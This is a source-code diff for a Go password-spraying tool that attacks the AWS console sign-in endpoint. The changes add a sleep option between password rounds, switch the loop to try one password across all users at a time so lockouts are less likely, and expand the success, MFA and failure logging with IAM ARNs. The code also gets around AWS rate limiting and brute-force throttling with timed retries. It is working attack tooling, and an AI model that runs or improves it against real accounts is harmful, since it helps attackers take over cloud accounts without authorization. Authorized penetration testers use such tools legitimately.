@@ -43,7 +43,7 @@ var (
 	fAccountID     string
 	fProxy         string
 	fStopOnSuccess bool
-	fVerbose       bool
+	fSleep         int
 	fDelay         int
 
 	signinURL = "https://signin.aws.amazon.com/authenticate"
@@ -78,10 +78,10 @@ func init() {
 	rootCmd.Flags().StringVarP(&fAccountID, "accountID", "a", "", "AWS Account ID (required)")
 	rootCmd.Flags().StringVarP(&fUserfile, "userfile", "u", "", "Username string or file (required)")
 	rootCmd.Flags().StringVarP(&fPassfile, "passfile", "p", "", "Password string or file (required)")
+	rootCmd.Flags().IntVarP(&fSleep, "sleep", "z", 0, "Optional Time to sleep between password requests")
 	rootCmd.Flags().IntVarP(&fDelay, "delay", "d", 0, "Optional Time Delay Between Requests for rate limiting")
 	rootCmd.Flags().StringVarP(&fProxy, "proxy", "x", "", "HTTP or Socks proxy URL & Port. Schema: proto://ip:port")
 	rootCmd.Flags().BoolVarP(&fStopOnSuccess, "stopOnSuccess", "s", false, "Stop password spraying on successful hit")
-	rootCmd.Flags().BoolVarP(&fVerbose, "verbose", "v", false, "Enable verbose logging")
 
 	rootCmd.MarkFlagRequired("accountID")
 	rootCmd.MarkFlagRequired("userfile")
@@ -109,8 +109,7 @@ func spray() {
 	}, opts)
 
 	var usernameList, passwordList []string
-	var userString string
-	var passString string
+	var userString, passString string
 
 	// Open the files
 	userfileHandle, err := os.Open(fUserfile)
@@ -124,7 +123,7 @@ func spray() {
 	}
 	defer passfileHandle.Close()
 
-	// Read username file or use provided string
+	// Read username file
 	if len(userString) == 0 {
 		scanner := bufio.NewScanner(userfileHandle)
 		for scanner.Scan() {
@@ -138,7 +137,7 @@ func spray() {
 		usernameList = []string{userString}
 	}
 
-	// Read password file or use provided string
+	// Read password file
 	if len(passString) == 0 {
 		scanner := bufio.NewScanner(passfileHandle)
 		for scanner.Scan() {
@@ -155,10 +154,8 @@ func spray() {
 	// Spraying Loop
 	log.Printf("%s: [%d] users loaded. [%d] passwords loaded. [%d] potential login requests.", title, len(usernameList), len(passwordList), (len(usernameList) * len(passwordList)))
 loop:
-	for _, user := range usernameList {
-		log.Printf("Spraying User: arn:aws:iam::%s:user/%s\n", fAccountID, user)
-		for _, pass := range passwordList {
-			log.Printf("%s:%s", user, pass)
+	for i, pass := range passwordList {
+		for _, user := range usernameList {
 			check := attemptLogin(client, user, pass, fAccountID, fDelay, 1)
 			// connection failures and stop on succes
 			if check == CONNFAIL || (fStopOnSuccess && check == SUCCESS) {
@@ -168,6 +165,10 @@ loop:
 			if check == ACCOUNTMFA || check == SUCCESS {
 				break
 			}
+		}
+		if (fSleep > 0) && (i < (len(passwordList) - 1)) {
+			log.Printf("%s: Sleep Value Configured. [%d/%d] Passwords Completed. Waiting %d seconds\n", title, (i + 1), len(passwordList), fSleep)
+			time.Sleep(time.Duration(fSleep) * time.Second)
 		}
 	}
 }
@@ -200,10 +201,10 @@ func attemptLogin(client *retryablehttp.Client, username string, password string
 	// If this exception occurs, that means a valid password was observed as a bunch of long cookies are made.
 	if err != nil {
 		if strings.Contains(err.Error(), "server response headers exceeded") {
-			log.Printf("(%s)\t[+] SUCCESS:\tValid Password: %s \tMFA: false\n", username, password)
+			log.Printf("[+] SUCCESS:\tarn:aws:iam::%s:user/%s\tValid Password: %s \tMFA: false\n", fAccountID, username, password)
 			return SUCCESS
 		} else {
-			log.Printf("(%s)\t[!] ERROR:\tHTTP Stack Failure. \tMessage: %s", username, err.Error())
+			log.Printf("[!] ERROR:\tarn:aws:iam::%s:user/%s\tHTTP Stack Failure. \tMessage: %s", fAccountID, username, err.Error())
 			return CONNFAIL
 		}
 	} else {
@@ -211,7 +212,7 @@ func attemptLogin(client *retryablehttp.Client, username string, password string
 
 		// check for bruteforce ratelimiting
 		if resp.StatusCode == 429 {
-			log.Printf("(%s)\t[!] WARNING:\tSending requests too quickly! Sleeping for 4 seconds to get around rate limiting...\n", username)
+			log.Printf("[!] WARNING:\tarn:aws:iam::%s:user/%s\tSending requests too quickly! Sleeping for 4 seconds to get around rate limiting...\n", fAccountID, username)
 			time.Sleep(4 * time.Second)
 			return attemptLogin(client, username, password, accountID, delay, 1)
 		}
@@ -220,31 +221,27 @@ func attemptLogin(client *retryablehttp.Client, username string, password string
 		body, _ := io.ReadAll(resp.Body)
 		var loginResponse AwsLoginResponse
 		if err2 := json.Unmarshal(body, &loginResponse); err2 != nil {
-			log.Printf("(%s)\t[!] ERROR:\tUnmarshal JSON Failure. AWS probably changed JSON response structure. \tMessage: %s", username, err.Error())
+			log.Printf("[!] ERROR:\tarn:aws:iam::%s:user/%s\tUnmarshal JSON Failure. AWS probably changed JSON response structure. \tMessage: %s", fAccountID, username, err.Error())
 			return FAILED
 		}
 
 		// Check for success and failure conditions
 		if loginResponse.State == "SUCCESS" {
 			if loginResponse.Properties.Result == "MFA" {
-				log.Printf("(%s)\t[*] MFA:\tValid username detected. Account Requires MFA. Skipping this user.\n", username)
+				log.Printf("[*] MFA:\tarn:aws:iam::%s:user/%s\tValid username detected. Account Requires MFA. Skipping this user.\n", fAccountID, username)
 				return ACCOUNTMFA
 			}
-			log.Printf("(%s)\t[+] SUCCESS:\tValid Password: %s \tMFA: false\n", username, password)
+			log.Printf("[+] SUCCESS:\tarn:aws:iam::%s:user/%s\tValid Password: %s \tMFA: false\n", fAccountID, username, password)
 			return SUCCESS
 		} else {
 			if strings.Contains(loginResponse.Properties.Text, "many invalid passwords have been used") {
-				if fVerbose {
-					log.Printf("(%s)\t[!] WARNING:\tAWS Account Bruteforce Ratelimit! Sleeping for %d seconds to get around this issue...\n", username, (5 * bfSleepRounds))
-				}
+				log.Printf("[!] WARNING:\tAWS Account Bruteforce Ratelimit! Sleeping for %d seconds to get around this issue...\n", (5 * bfSleepRounds))
 				time.Sleep(time.Duration(5*bfSleepRounds) * time.Second)
 
 				// increase the time delay since we have hit the bruteforce ratelimit check
 				return attemptLogin(client, username, password, accountID, delay, (bfSleepRounds + 1))
 			}
-			if fVerbose {
-				log.Printf("(%s)\t[-] FAIL:\tInvalid Password: %s\n", username, password)
-			}
+			log.Printf("[-] FAIL:\tarn:aws:iam::%s:user/%s\tInvalid Password: %s\n", fAccountID, username, password)
 			return FAILED
 		}
 	}
